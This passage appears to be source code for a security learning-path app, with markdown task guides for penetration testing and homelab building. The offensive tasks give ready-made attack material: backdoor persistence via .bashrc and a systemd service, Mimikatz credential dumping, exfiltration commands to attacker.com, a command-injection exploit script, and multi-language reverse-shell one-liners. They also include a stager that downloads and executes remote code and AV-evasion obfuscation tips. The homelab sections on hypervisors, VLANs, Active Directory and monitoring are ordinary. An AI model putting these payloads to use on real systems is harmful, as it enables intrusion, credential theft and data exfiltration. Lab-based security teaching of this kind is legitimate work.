echo "/tmp/shell.sh &" >> ~/.bashrc

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Service]
ExecStart=/tmp/shell.sh
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
\`\`\`

### Credential Harvesting
\`\`\`powershell
# Mimikatz
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
mimikatz# lsadump::dcsync /user:Administrator

# Windows Credential Manager
cmdkey /list
\`\`\`

\`\`\`bash
# Linux
cat /etc/shadow
find / -name "*.conf" -exec grep -l password {} \\;
cat ~/.bash_history
\`\`\`

### Pivoting
\`\`\`bash
# SSH Local Port Forward
ssh -L 8080:internal-server:80 user@pivot

# SSH Dynamic SOCKS Proxy
ssh -D 9050 user@pivot
proxychains nmap internal-network

# Chisel
# Server (attacker):
chisel server -p 8080 --reverse
# Client (victim):
chisel client attacker:8080 R:socks

# Ligolo-ng (modern, fast)
# Setup on attacker, agent on victim
# Creates virtual interface for direct access
\`\`\`

### Data Exfiltration
\`\`\`bash
# HTTP
curl -X POST -d @secret.txt https://attacker.com/upload

# DNS
cat secret.txt | xxd -p | xargs -I {} dig {}.attacker.com

# ICMP
hping3 --icmp attacker.com -d 100 -E secret.txt
\`\`\`

## Completion Criteria
- [ ] Establish persistence mechanism
- [ ] Extract credentials with Mimikatz
- [ ] Set up pivot to internal network
- [ ] Practice data exfiltration`],
			]},
			{ name: 'Tooling', desc: 'Build your own', tasks: [
				['Build a scanner', 'Concurrent port scanner in Go/Python. Service detection with banner grabbing. Output: open ports, service versions. Add vulnerability checks for common issues.',
`## Building a Port Scanner

### Concurrent Scanner (Go)
\`\`\`go
package main

import (
    "fmt"
    "net"
    "sync"
    "time"
)

func scanPort(host string, port int, results chan<- int, wg *sync.WaitGroup) {
    defer wg.Done()

    address := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", address, 1*time.Second)
    if err != nil {
        return
    }
    conn.Close()
    results <- port
}

func main() {
    host := "10.10.10.5"
    results := make(chan int, 100)
    var wg sync.WaitGroup

    // Semaphore for concurrency limit
    sem := make(chan struct{}, 100)

    for port := 1; port <= 65535; port++ {
        wg.Add(1)
        sem <- struct{}{}
        go func(p int) {
            scanPort(host, p, results, &wg)
            <-sem
        }(port)
    }

    go func() {
        wg.Wait()
        close(results)
    }()

    for port := range results {
        fmt.Printf("Port %d open\\n", port)
    }
}
\`\`\`

### Banner Grabbing
\`\`\`go
func grabBanner(host string, port int) string {
    address := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", address, 2*time.Second)
    if err != nil {
        return ""
    }
    defer conn.Close()

    conn.SetReadDeadline(time.Now().Add(2 * time.Second))

    // Some services send banner immediately
    buf := make([]byte, 1024)
    n, _ := conn.Read(buf)
    if n > 0 {
        return string(buf[:n])
    }

    // Try HTTP probe
    conn.Write([]byte("GET / HTTP/1.0\\r\\n\\r\\n"))
    n, _ = conn.Read(buf)
    return string(buf[:n])
}
\`\`\`

### Service Detection
\`\`\`go
func detectService(banner string, port int) string {
    switch {
    case strings.Contains(banner, "SSH"):
        return "SSH"
    case strings.Contains(banner, "HTTP"):
        return "HTTP"
    case strings.Contains(banner, "FTP"):
        return "FTP"
    case port == 22:
        return "SSH (likely)"
    case port == 80 || port == 8080:
        return "HTTP (likely)"
    default:
        return "Unknown"
    }
}
\`\`\`

## Completion Criteria
- [ ] Scan all 65535 ports quickly
- [ ] Handle concurrency properly
- [ ] Grab and identify banners
- [ ] Output in structured format`],

				['Create an exploit', 'Pick a CVE with public PoC. Understand the vulnerability. Adapt exploit for target. Add reliability: check version, handle errors. Document usage.',
`## Exploit Development Process

### Choose a CVE
\`\`\`markdown
Good first exploits:
- Simple buffer overflows
- Command injection
- Path traversal
- Deserialization

Resources:
- Exploit-DB: https://exploit-db.com
- GitHub PoCs: search "CVE-XXXX-YYYY"
- Vulhub: Docker environments for practice
\`\`\`

### Understand the Vulnerability
\`\`\`python
# Example: Command injection in web app
# Vulnerable code:
# os.system("ping " + user_input)

# Root cause: User input passed to shell command
# Impact: Remote code execution
# Exploit: ; whoami

# Test payload progression:
payloads = [
    "127.0.0.1",            # Normal input
    "127.0.0.1; whoami",    # Basic injection
    "127.0.0.1| whoami",    # Pipe
    "\`whoami\`",             # Backticks
    "$(whoami)",            # Command substitution
]
\`\`\`

### Build Reliable Exploit
\`\`\`python
#!/usr/bin/env python3
import requests
import sys

def check_vulnerable(target):
    """Check if target is vulnerable before exploiting"""
    try:
        resp = requests.get(f"{target}/version", timeout=5)
        version = resp.json().get("version", "")
        # Vulnerable: < 1.2.3
        return version < "1.2.3"
    except:
        return None

def exploit(target, command):
    """Execute command on vulnerable target"""
    payload = f"127.0.0.1; {command}"

    try:
        resp = requests.post(
            f"{target}/ping",
            data={"host": payload},
            timeout=10
        )
        return resp.text
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target> <command>")
        sys.exit(1)

    target = sys.argv[1]
    command = sys.argv[2]

    print(f"[*] Checking {target}...")
    if not check_vulnerable(target):
        print("[-] Target not vulnerable or unreachable")
        sys.exit(1)

    print(f"[+] Target vulnerable, executing: {command}")
    result = exploit(target, command)
    print(result)

if __name__ == "__main__":
    main()
\`\`\`

### Documentation
\`\`\`markdown
# CVE-XXXX-YYYY Exploit

## Description
Command injection in Application v1.0.0 - v1.2.2

## Affected Versions
- 1.0.0 to 1.2.2 (fixed in 1.2.3)

## Usage
\`\`\`
python3 exploit.py http://target:8080 "id"
\`\`\`

## Requirements
- Python 3
- requests library

## References
- https://nvd.nist.gov/vuln/detail/CVE-XXXX-YYYY
\`\`\`

## Completion Criteria
- [ ] Choose CVE and understand root cause
- [ ] Build working exploit
- [ ] Add version checking
- [ ] Document usage`],

				['Develop a payload', 'Reverse shell: connect back, spawn shell, redirect I/O. Stager: small first stage downloads larger payload. Obfuscation to evade basic detection.',
`## Payload Development

### Basic Reverse Shell (Python)
\`\`\`python
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Redirect stdin/stdout/stderr to socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Spawn shell
    subprocess.call(["/bin/bash", "-i"])

reverse_shell("10.10.14.5", 4444)
\`\`\`

### Stager Pattern
\`\`\`python
# Stage 1: Small downloader (evades size-based detection)
import urllib.request
import subprocess

stage2_url = "http://10.10.14.5/stage2.py"
code = urllib.request.urlopen(stage2_url).read()
exec(code)
\`\`\`

\`\`\`python
# Stage 2: Full payload (downloaded from attacker server)
# Contains: reverse shell, persistence, exfiltration, etc.
\`\`\`

### Reverse Shell One-Liners
\`\`\`bash
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
\`\`\`

### Basic Obfuscation
\`\`\`python
# String obfuscation
import base64

payload = "import socket..."
encoded = base64.b64encode(payload.encode()).decode()
# Execute: exec(base64.b64decode("aW1wb3J0IHNv...").decode())

# Variable name obfuscation
_0x1a2b = socket
_0x3c4d = subprocess
\`\`\`

\`\`\`powershell
# PowerShell obfuscation
# Character codes
[char]105+[char]101+[char]120  # "iex"

# Encoded command
powershell -enc <base64>
\`\`\`

### Listener
\`\`\`bash
# Simple netcat listener
nc -lvnp 4444

# With readline (better shell)
rlwrap nc -lvnp 4444

# Metasploit handler
msfconsole -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
\`\`\`

## Completion Criteria
- [ ] Build working reverse shell
- [ ] Implement stager pattern
- [ ] Add basic obfuscation
- [ ] Test against AV (in lab)`],

				['Write a parser', 'Parse Nmap XML, Burp logs, or BloodHound JSON. Extract actionable data: high-value targets, credentials, attack paths. Output to database or report.',
`## Security Tool Output Parsing

### Nmap XML Parser
\`\`\`python
import xml.etree.ElementTree as ET

def parse_nmap(xml_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()

    results = []

    for host in root.findall('host'):
        ip = host.find('address').get('addr')
        hostname = ""

        hostnames = host.find('hostnames')
        if hostnames is not None:
            hn = hostnames.find('hostname')
            if hn is not None:
                hostname = hn.get('name')

        ports = []
        ports_elem = host.find('ports')
        if ports_elem is not None:
            for port in ports_elem.findall('port'):
                port_id = port.get('portid')
                protocol = port.get('protocol')

                state = port.find('state').get('state')
                if state != 'open':
                    continue

                service = port.find('service')
                service_name = service.get('name', '') if service is not None else ''
                version = service.get('product', '') if service is not None else ''

                ports.append({
                    'port': port_id,
                    'protocol': protocol,
                    'service': service_name,
                    'version': version
                })

        results.append({
            'ip': ip,
            'hostname': hostname,
            'ports': ports
        })

    return results

# Usage
hosts = parse_nmap('scan.xml')
for host in hosts:
    print(f"\\n{host['ip']} ({host['hostname']})")
    for port in host['ports']:
        print(f"  {port['port']}/{port['protocol']} - {port['service']} {port['version']}")
\`\`\`

### BloodHound JSON Parser
\`\`\`python
import json

def find_attack_paths(bloodhound_json):
    with open(bloodhound_json) as f:
        data = json.load(f)

    high_value = []
    kerberoastable = []

    for user in data.get('users', []):
        props = user.get('Properties', {})

        # High value targets
        if props.get('highvalue'):
            high_value.append(user['Properties']['name'])

        # Kerberoastable
        if props.get('hasspn') and not props.get('admincount'):
            kerberoastable.append({
                'name': props['name'],
                'serviceprincipalnames': props.get('serviceprincipalnames', [])
            })

    return {
        'high_value_targets': high_value,
        'kerberoastable_users': kerberoastable
    }
\`\`\`

### Output to Database
\`\`\`python
import sqlite3

def save_to_db(results, db_path='recon.db'):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()

    c.execute('''CREATE TABLE IF NOT EXISTS hosts
                 (ip TEXT PRIMARY KEY, hostname TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS ports
                 (host_ip TEXT, port INTEGER, service TEXT, version TEXT)''')

    for host in results:
        c.execute('INSERT OR REPLACE INTO hosts VALUES (?, ?)',
                  (host['ip'], host['hostname']))
        for port in host['ports']:
            c.execute('INSERT INTO ports VALUES (?, ?, ?, ?)',
                      (host['ip'], port['port'], port['service'], port['version']))

    conn.commit()
    conn.close()
\`\`\`

## Completion Criteria
- [ ] Parse Nmap XML output
- [ ] Extract high-value targets
- [ ] Store results in database
- [ ] Generate actionable report`],

				['Automate workflow', 'Chain tools: recon → enumeration → exploitation. Handle errors, log results. Parallel execution where possible. Config-driven target specification.',
`## Automated Pentest Workflow

### Configuration-Driven Design
\`\`\`yaml
# targets.yaml
project: "Internal Pentest"
targets:
  - range: 10.10.10.0/24
    scope: internal
  - domain: target.com
    scope: external

options:
  threads: 50
  timeout: 30
  output_dir: ./results

phases:
  - name: discovery
    enabled: true
  - name: enumeration
    enabled: true
  - name: vulnerability_scan
    enabled: true
\`\`\`

### Main Orchestrator
\`\`\`python
#!/usr/bin/env python3
import yaml
import logging
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class PentestAutomation:
    def __init__(self, config_path):
        with open(config_path) as f:
            self.config = yaml.safe_load(f)
        self.output_dir = Path(self.config['options']['output_dir'])
        self.output_dir.mkdir(exist_ok=True)

    def run_phase(self, phase_name, func, targets):
        logger.info(f"Starting phase: {phase_name}")
        results = []

        with ThreadPoolExecutor(max_workers=self.config['options']['threads']) as executor:
            futures = {executor.submit(func, t): t for t in targets}

            for future in as_completed(futures):
                target = futures[future]
                try:
                    result = future.result()
                    results.append(result)
                    logger.info(f"Completed: {target}")
                except Exception as e:
                    logger.error(f"Failed {target}: {e}")

        return results

    def discovery(self, target_range):
        """Host discovery with nmap"""
        output = self.output_dir / f"discovery_{target_range.replace('/', '_')}.xml"
        cmd = f"nmap -sn {target_range} -oX {output}"

        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        return parse_nmap_hosts(output)

    def enumerate_host(self, host):
        """Full port scan and service detection"""
        output = self.output_dir / f"enum_{host}.xml"
        cmd = f"nmap -sV -sC -p- {host} -oX {output}"

        subprocess.run(cmd.split(), capture_output=True)
        return parse_nmap_services(output)

    def vuln_scan(self, host):
        """Vulnerability scanning"""
        output = self.output_dir / f"vuln_{host}.xml"
        cmd = f"nmap --script=vuln {host} -oX {output}"

        subprocess.run(cmd.split(), capture_output=True)
        return parse_nmap_vulns(output)

    def run(self):
        # Phase 1: Discovery
        all_hosts = []
        for target in self.config['targets']:
            if 'range' in target:
                hosts = self.discovery(target['range'])
                all_hosts.extend(hosts)

        logger.info(f"Discovered {len(all_hosts)} hosts")

        # Phase 2: Enumeration
        enum_results = self.run_phase('enumeration', self.enumerate_host, all_hosts)

        # Phase 3: Vulnerability Scan
        vuln_results = self.run_phase('vulnerability', self.vuln_scan, all_hosts)

        # Generate report
        self.generate_report(all_hosts, enum_results, vuln_results)

if __name__ == "__main__":
    automation = PentestAutomation("targets.yaml")
    automation.run()
\`\`\`

### Error Handling & Logging
\`\`\`python
def safe_execute(func, target, retries=3):
    for attempt in range(retries):
        try:
            return func(target)
        except TimeoutError:
            logger.warning(f"Timeout on {target}, retry {attempt + 1}")
        except Exception as e:
            logger.error(f"Error on {target}: {e}")
            if attempt == retries - 1:
                raise
    return None
\`\`\`

## Completion Criteria
- [ ] Config-driven target specification
- [ ] Parallel execution of scans
- [ ] Error handling and retries
- [ ] Structured logging and reporting`],
			]},
		]);
	} else if (path.name.includes('Homelab')) {
		addTasks(path.id, [
			{ name: 'Infrastructure Setup', desc: 'Build foundation', tasks: [
				['Set up hypervisor', 'Proxmox VE (free, KVM-based) or ESXi. Allocate CPU/RAM for VMs. Set up storage: local SSD, NFS share, or Ceph for clustering. Template VMs for quick deployment.',
`## Hypervisor Setup

### Proxmox VE Installation
\`\`\`bash
# Download ISO from proxmox.com
# Boot from USB, follow installer
# Access web UI: https://<ip>:8006

# Post-install: remove enterprise repo (if no subscription)
rm /etc/apt/sources.list.d/pve-enterprise.list
echo "deb http://download.proxmox.com/debian/pve bullseye pve-no-subscription" > /etc/apt/sources.list.d/pve-no-sub.list
apt update && apt upgrade
\`\`\`

### Storage Configuration
\`\`\`bash
# Local storage (already configured)
# /var/lib/vz - ISOs, templates, backups

# Add NFS storage (Datacenter → Storage → Add → NFS)
# ID: nfs-storage
# Server: 192.168.1.10
# Export: /mnt/storage

# ZFS pool for VMs (if using ZFS)
zpool create -f tank /dev/sdb /dev/sdc
# Add in Proxmox: Datacenter → Storage → Add → ZFS
\`\`\`

### VM Templates
\`\`\`bash
# Download cloud image
wget https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudimg-amd64.img

# Create VM
qm create 9000 --name ubuntu-template --memory 2048 --cores 2 --net0 virtio,bridge=vmbr0

# Import disk
qm importdisk 9000 jammy-server-cloudimg-amd64.img local-lvm

# Attach disk
qm set 9000 --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-9000-disk-0

# Cloud-init drive
qm set 9000 --ide2 local-lvm:cloudinit
qm set 9000 --boot c --bootdisk scsi0

# Convert to template
qm template 9000

# Clone from template
qm clone 9000 100 --name web-server --full
\`\`\`

### Resource Allocation
\`\`\`
Best practices:
- Don't overcommit CPU more than 4:1
- Leave 2GB RAM for hypervisor
- Use virtio for network and disk
- Enable QEMU guest agent

Example allocation (32GB RAM, 8 cores):
- Domain Controller: 4GB, 2 cores
- Monitoring: 4GB, 2 cores
- Web servers (x2): 2GB each, 1 core
- Security lab: 8GB, 4 cores
- Available: 12GB for expansion
\`\`\`

## Completion Criteria
- [ ] Proxmox installed and accessible
- [ ] Storage configured (local + NFS/ZFS)
- [ ] VM template created
- [ ] Can deploy VMs from template`],

				['Configure networking', 'Create VLANs: management (10), servers (20), users (30), IoT (40), security lab (100). pfSense/OPNsense firewall: inter-VLAN rules, NAT, VPN. Document IP scheme.',
`## Network Architecture

### VLAN Design
\`\`\`
VLAN 10 - Management:  10.0.10.0/24
  - Hypervisor: 10.0.10.1
  - Switches: 10.0.10.2-10
  - iDRAC/IPMI: 10.0.10.20-30

VLAN 20 - Servers:     10.0.20.0/24
  - Domain Controller: 10.0.20.10
  - File Server: 10.0.20.11
  - Docker Host: 10.0.20.20

VLAN 30 - Users:       10.0.30.0/24
  - DHCP: 10.0.30.100-200
  - Workstations

VLAN 40 - IoT:         10.0.40.0/24
  - Smart devices (isolated)

VLAN 100 - Security:   10.0.100.0/24
  - Kali: 10.0.100.10
  - Vulnerable VMs: 10.0.100.20-50
\`\`\`

### Proxmox VLAN Setup
\`\`\`bash
# /etc/network/interfaces
auto vmbr0
iface vmbr0 inet manual
    bridge-ports eno1
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 2-4094

# In VM config, set VLAN tag:
# net0: virtio,bridge=vmbr0,tag=20
\`\`\`

### pfSense/OPNsense Setup
\`\`\`
1. Install pfSense VM
   - WAN: DHCP from ISP (or static)
   - LAN: 10.0.10.1/24

2. Create VLAN interfaces
   - Interfaces → Assignments → VLANs
   - Add VLAN 20, 30, 40, 100 on LAN parent

3. Assign interfaces
   - OPT1 (VLAN20) = 10.0.20.1/24
   - OPT2 (VLAN30) = 10.0.30.1/24
   - etc.

4. DHCP Server
   - Enable per VLAN
   - Set ranges, DNS, gateway

5. Firewall Rules
   - Default: block inter-VLAN
   - Allow: Servers → Internet
   - Allow: Users → Servers (specific ports)
   - Allow: Management → All
   - Block: IoT → everything except Internet
   - Block: Security Lab → production VLANs
\`\`\`

### DNS Configuration
\`\`\`
pfSense DNS Resolver:
- Enable DHCP registration
- Override: *.lab.local → 10.0.20.10 (DC)

Or use Pi-hole:
- Set as DNS for all VLANs
- Add local DNS entries
\`\`\`

## Completion Criteria
- [ ] VLANs created and tagged
- [ ] pfSense routing between VLANs
- [ ] Firewall rules restrict traffic
- [ ] DHCP and DNS working`],

				['Deploy domain controller', 'Windows Server with AD DS role. Create domain: lab.local. Add DNS, DHCP. Create OUs, users, groups. GPOs for security settings. Second DC for redundancy.',
`## Active Directory Setup

### Install Domain Controller
\`\`\`powershell
# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest \`
    -DomainName "lab.local" \`
    -DomainNetBIOSName "LAB" \`
    -InstallDns:$true \`
    -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)

# Restart
Restart-Computer
\`\`\`

### DNS Configuration
\`\`\`powershell
# Add reverse lookup zone
Add-DnsServerPrimaryZone -NetworkId "10.0.20.0/24" -ReplicationScope Domain

# Add DNS forwarders
Set-DnsServerForwarder -IPAddress 8.8.8.8, 1.1.1.1

# Create A records
Add-DnsServerResourceRecordA -ZoneName "lab.local" -Name "proxmox" -IPv4Address "10.0.10.1"
\`\`\`

### Organizational Units
\`\`\`powershell
# Create OU structure
New-ADOrganizationalUnit -Name "Lab" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Users" -Path "OU=Lab,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Computers" -Path "OU=Lab,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Servers" -Path "OU=Lab,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Groups" -Path "OU=Lab,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Service Accounts" -Path "OU=Lab,DC=lab,DC=local"
\`\`\`

### Users and Groups
\`\`\`powershell
# Create users
$password = ConvertTo-SecureString "UserP@ss1" -AsPlainText -Force
New-ADUser -Name "John Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@lab.local" \`
    -Path "OU=Users,OU=Lab,DC=lab,DC=local" -AccountPassword $password -Enabled $true

# Create groups
New-ADGroup -Name "IT Admins" -GroupScope Global -Path "OU=Groups,OU=Lab,DC=lab,DC=local"
Add-ADGroupMember -Identity "IT Admins" -Members "jsmith"

# Service account with SPN (for Kerberoasting practice)
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -UserPrincipalName "svc_sql@lab.local" \`
    -Path "OU=Service Accounts,OU=Lab,DC=lab,DC=local" -AccountPassword $password -Enabled $true
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/sql.lab.local:1433"}
\`\`\`

### Group Policy
\`\`\`powershell
# Create and link GPO
New-GPO -Name "Security Baseline" | New-GPLink -Target "OU=Lab,DC=lab,DC=local"

# Configure via GUI or:
# - Password policy (complexity, length, history)
# - Account lockout
# - Audit policy (logon events, object access)
# - Disable LLMNR, NetBIOS
\`\`\`

## Completion Criteria
- [ ] Domain controller promoted
- [ ] DNS and DHCP configured
- [ ] OU structure created
- [ ] Users, groups, GPOs in place`],

				['Add monitoring', 'Prometheus: scrape metrics from node_exporter, windows_exporter. Grafana dashboards: CPU, memory, disk, network. Alerts: Alertmanager → email/Slack when thresholds exceeded.',
`## Monitoring Stack

### Prometheus Setup (Docker)
\`\`\`yaml
# docker-compose.yml
version: '3'
services:
  prometheus:
    image: prom/prometheus
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus_data:/prometheus
    ports:
      - "9090:9090"
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.retention.time=30d'

  grafana:
    image: grafana/grafana
    volumes:
      - grafana_data:/var/lib/grafana
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin

  alertmanager:
    image: prom/alertmanager
    volumes:
      - ./alertmanager.yml:/etc/alertmanager/alertmanager.yml
    ports:
      - "9093:9093"

volumes:
  prometheus_data:
  grafana_data:
\`\`\`

### Prometheus Configuration
\`\`\`yaml
# prometheus.yml
global:
  scrape_interval: 15s

alerting:
  alertmanagers:
    - static_configs:
        - targets: ['alertmanager:9093']

rule_files:
  - 'alerts.yml'

scrape_configs:
  - job_name: 'prometheus'
    static_configs:
      - targets: ['localhost:9090']

  - job_name: 'node'
    static_configs:
      - targets:
        - '10.0.20.10:9100'  # Linux servers
        - '10.0.20.11:9100'

  - job_name: 'windows'
    static_configs:
      - targets:
        - '10.0.20.15:9182'  # Windows exporter
\`\`\`

### Node Exporter (Linux)
\`\`\`bash
# Install on each Linux server
wget https://github.com/prometheus/node_exporter/releases/download/v1.5.0/node_exporter-1.5.0.linux-amd64.tar.gz
tar xvf node_exporter-*.tar.gz
sudo mv node_exporter-*/node_exporter /usr/local/bin/

# Systemd service
sudo tee /etc/systemd/system/node_exporter.service << EOF
[Unit]
Description=Node Exporter
[Service]
ExecStart=/usr/local/bin/node_exporter
[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable --now node_exporter
\`\`\`

### Alert Rules
\`\`\`yaml
# alerts.yml
groups:
  - name: basic
    rules:
      - alert: HostDown
        expr: up == 0
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "Host {{ $labels.instance }} down"

      - alert: HighCPU
        expr: 100 - (avg by(instance) (irate(node_cpu_seconds_total{mode="idle"}[5m])) * 100) > 80
        for: 5m
        labels:
          severity: warning

      - alert: DiskSpaceLow
        expr: (node_filesystem_avail_bytes / node_filesystem_size_bytes) * 100 < 10
        for: 5m
        labels:
          severity: warning
\`\`\`

### Grafana Dashboards
\`\`\`
Import community dashboards:
- Node Exporter Full: ID 1860
- Windows Exporter: ID 14694

Create custom dashboard:
- CPU usage per host
- Memory usage
- Disk I/O
- Network traffic
- Service status
\`\`\`

## Completion Criteria
- [ ] Prometheus scraping all hosts
- [ ] Grafana dashboards configured
- [ ] Alert rules defined
- [ ] Alertmanager sending notifications`],

				['Set up logging', 'ELK (Elasticsearch, Logstash, Kibana) or Loki+Grafana. Collect: Windows Event Logs (Winlogbeat), syslog (rsyslog), application logs. Dashboards for security events, search interface.',
`## Centralized Logging

### Loki + Grafana (Lightweight Option)
\`\`\`yaml
# docker-compose.yml (add to monitoring stack)
  loki:
    image: grafana/loki:2.8.0
    ports:
      - "3100:3100"
    volumes:
      - ./loki-config.yml:/etc/loki/local-config.yaml
      - loki_data:/loki
    command: -config.file=/etc/loki/local-config.yaml

  promtail:
    image: grafana/promtail:2.8.0
    volumes:
      - /var/log:/var/log:ro
      - ./promtail-config.yml:/etc/promtail/config.yml
    command: -config.file=/etc/promtail/config.yml
\`\`\`

\`\`\`yaml
# promtail-config.yml
server:
  http_listen_port: 9080

positions:
  filename: /tmp/positions.yaml

clients:
  - url: http://loki:3100/loki/api/v1/push

scrape_configs:
  - job_name: system
    static_configs:
      - targets:
          - localhost
        labels:
          job: varlogs
          __path__: /var/log/*.log

  - job_name: syslog
    syslog:
      listen_address: 0.0.0.0:1514
      labels:
        job: syslog
    relabel_configs:
      - source_labels: [__syslog_message_hostname]
        target_label: host
\`\`\`

### ELK Stack (Full Featured)
\`\`\`yaml
# docker-compose.yml
  elasticsearch:
    image: elasticsearch:8.8.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms1g -Xmx1g"
    volumes:
      - es_data:/usr/share/elasticsearch/data
    ports:
      - "9200:9200"

  kibana:
    image: kibana:8.8.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
\`\`\`

### Windows Event Forwarding
\`\`\`powershell
# Install Winlogbeat
# Download from elastic.co

# winlogbeat.yml
winlogbeat.event_logs:
  - name: Security
    event_id: 4624, 4625, 4648, 4672, 4768, 4769, 4776
  - name: System
  - name: Application

output.elasticsearch:
  hosts: ["10.0.20.30:9200"]

# Or to Logstash
output.logstash:
  hosts: ["10.0.20.30:5044"]
\`\`\`

### Syslog from Network Devices
\`\`\`bash
# pfSense: Status → System Logs → Settings
# Remote log servers: 10.0.20.30:1514

# Linux servers: /etc/rsyslog.conf
*.* @10.0.20.30:1514
\`\`\`

### Security Dashboards (Kibana/Grafana)
\`\`\`
Key views:
- Failed logins over time
- Successful logins by user
- Account lockouts
- Privilege escalation events (4672, 4673)
- Process creation (if Sysmon enabled)
- Firewall blocks

Alerts:
- Multiple failed logins from same source
- Login outside business hours
- New admin account created
- Service installed
\`\`\`

## Completion Criteria
- [ ] Log aggregation working
- [ ] Windows events collected
- [ ] Syslog from network devices
- [ ] Security dashboard created`],
			]},
			{ name: 'Security Lab', desc: 'Practice environment', tasks: [
				['Deploy vulnerable machines', 'Metasploitable 2/3, DVWA, VulnHub boxes, HackTheBox/TryHackMe VPN. Isolated VLAN. Document intentional vulnerabilities. Rotate machines for variety.',
`## Vulnerable Machine Deployment

### Metasploitable 2/3
\`\`\`bash
# Metasploitable 2 - Classic vulnerable VM
# Download from SourceForge
# Import OVA into Proxmox/VirtualBox
# Default creds: msfadmin:msfadmin

# Services running:
# - FTP (vsftpd 2.3.4 - backdoor)
# - SSH
# - Telnet
# - SMTP
# - HTTP (Apache, PHP vulnerabilities)
# - MySQL (weak creds)
# - PostgreSQL
# - Samba (usermap_script)
# - distccd (RCE)

# Metasploitable 3 - Windows + Ubuntu
# Use Vagrant to build
git clone https://github.com/rapid7/metasploitable3.git
cd metasploitable3
vagrant up
\`\`\`

### DVWA (Damn Vulnerable Web App)
\`\`\`bash
# Docker deployment
docker run -d -p 80:80 vulnerables/web-dvwa

# Or on LAMP stack
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
# Configure database in config/config.inc.php

# Vulnerabilities:
# - SQL Injection
# - XSS (Reflected, Stored, DOM)
# - Command Injection
# - File Inclusion
# - File Upload
# - CSRF
# - Brute Force
\`\`\`

### VulnHub Machines
\`\`\`bash
# Download from vulnhub.com
# Good beginner boxes:
# - Kioptrix series
# - Mr-Robot
# - DC series (DC-1 through DC-9)
# - Stapler

# Import to Proxmox
qm importovf 200 machine.ovf local-lvm
# Ensure on isolated VLAN 100
\`\`\`

### HackTheBox/TryHackMe
\`\`\`bash
# HTB VPN
sudo openvpn lab_user.ovpn

# Access machines at 10.10.10.x
# Starting point machines for beginners:
# - Lame, Jerry, Blue (easy)
# - Bashed, Nibbles, Shocker

# TryHackMe has guided rooms:
# - Complete Beginner path
# - Jr Penetration Tester
\`\`\`

### Documentation Template
\`\`\`markdown
# Machine: [Name]
## Network: VLAN 100 - 10.0.100.X

## Intentional Vulnerabilities
| Service | Port | Vulnerability | Difficulty |
|---------|------|---------------|------------|
| vsftpd  | 21   | Backdoor CVE-2011-2523 | Easy |
| Samba   | 445  | usermap_script | Easy |
| HTTP    | 80   | LFI in page param | Medium |

## Attack Paths
1. FTP backdoor → shell as root
2. Samba → shell as root
3. HTTP LFI → SSH key → user → priv esc
\`\`\`

## Completion Criteria
- [ ] At least 3 vulnerable VMs deployed
- [ ] VMs on isolated VLAN
- [ ] Document vulnerabilities for each
- [ ] Can access from attack machine`],

				['Set up attack machine', 'Kali or Parrot Linux VM. Install additional tools: BloodHound, CrackMapExec, Sliver. Access to vulnerable VLAN. Separate from production network.',
`## Attack Machine Setup

### Kali Linux VM
\`\`\`bash
# Download from kali.org (VM image)
# Import to Proxmox

